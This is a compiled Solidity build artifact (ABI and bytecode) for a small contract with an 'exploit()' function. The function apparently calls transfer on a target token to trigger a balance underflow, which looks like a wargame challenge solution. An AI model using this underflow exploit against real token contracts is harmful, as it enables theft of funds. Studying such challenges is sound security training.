{"abi":[{"type":"constructor","inputs":[{"name":"_tokenAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"token","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Token"}],"stateMutability":"view"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516101d63803806101d68339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b0319909216919091179055610171806100656000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806363d9b7701461003b578063fc0c546a14610045575b600080fd5b610043610076565b005b61004d61011f565b6040805173ffffffffffffffffffffffffffffffffffffffff9092168252519081900360200190f35b60008054604080517fa9059cbb00000000000000000000000000000000000000000000000000000000815233600482015260156024820152905173ffffffffffffffffffffffffffffffffffffffff9092169263a9059cbb926044808401936020939083900390910190829087803b1580156100f157600080fd5b505af1158015610105573d6000803e3d6000fd5b505050506040513d602081101561011b57600080fd5b5050565b60005473ffffffffffffffffffffffffffffffffffffffff168156fea264697066735822122009cf2a45e8547b1023cab50ec20fc619638aa3f41fc0c247fded51a68da10ccf64736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"exploit()":"63d9b770","token()":"fc0c546a"},"id":0}